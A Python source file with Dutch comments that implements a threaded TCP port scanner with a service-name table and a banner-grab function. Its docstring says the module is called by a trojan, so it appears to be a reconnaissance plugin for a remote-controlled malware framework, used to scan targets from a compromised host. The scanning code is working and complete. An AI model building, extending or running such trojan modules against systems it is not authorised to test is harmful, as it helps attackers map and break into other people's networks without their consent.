"""
Portscan Module
Scant opgegeven poorten van een target IP
"""

import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


def run(params):
    """
    Hoofdfunctie die wordt aangeroepen door de trojan
    params: dict met target en poorten
    """
    target = params.get("target", "127.0.0.1")
    poorten = params.get("poorten", [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 8080])
    timeout = params.get("timeout", 1)
    
    resultaat = {
        "module": "portscan",
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "open_poorten": [],
        "gesloten_poorten": [],
        "scan_info": {}
    }
    
    print(f"[*] Start portscan op {target}")
    
    # Resolve hostname naar IP als nodig
    try:
        ip = socket.gethostbyname(target)
        resultaat["scan_info"]["resolved_ip"] = ip
    except socket.gaierror:
        resultaat["scan_info"]["fout"] = f"Kon {target} niet resolven"
        return resultaat
    
    # Scan poorten met threading voor snelheid
    open_poorten = scan_poorten_threaded(ip, poorten, timeout)
    
    for poort in poorten:
        if poort in open_poorten:
            service = krijg_service_naam(poort)
            resultaat["open_poorten"].append({
                "poort": poort,
                "status": "open",
                "service": service
            })
        else:
            resultaat["gesloten_poorten"].append(poort)
    
    resultaat["scan_info"]["totaal_gescand"] = len(poorten)
    resultaat["scan_info"]["totaal_open"] = len(open_poorten)
    
    print(f"[+] Scan compleet: {len(open_poorten)} open poort(en) gevonden")
    
    return resultaat


def scan_poort(ip, poort, timeout):
    """Scan een enkele poort"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        resultaat = sock.connect_ex((ip, poort))
        sock.close()
        return resultaat == 0
    except:
        return False


def scan_poorten_threaded(ip, poorten, timeout):
    """Scan meerdere poorten met threads"""
    open_poorten = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submit alle port scans
        futures = {
            executor.submit(scan_poort, ip, poort, timeout): poort 
            for poort in poorten
        }
        
        # Verzamel resultaten
        for future in as_completed(futures):
            poort = futures[future]
            try:
                if future.result():
                    open_poorten.append(poort)
            except:
                pass
    
    return open_poorten


def krijg_service_naam(poort):
    """Geef bekende service naam voor poort"""
    services = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        135: "RPC",
        139: "NetBIOS",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        993: "IMAPS",
        995: "POP3S",
        1433: "MSSQL",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        5900: "VNC",
        8080: "HTTP-Proxy",
        8443: "HTTPS-Alt"
    }
    return services.get(poort, "onbekend")


def banner_grab(ip, poort, timeout=2):
    """
    Probeer banner te krijgen van een open poort
    Optionele functie voor meer info
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, poort))
        
        # Stuur basis request voor HTTP
        if poort in [80, 8080]:
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        return banner.strip()[:100]  # Eerste 100 chars
    except:
        return None
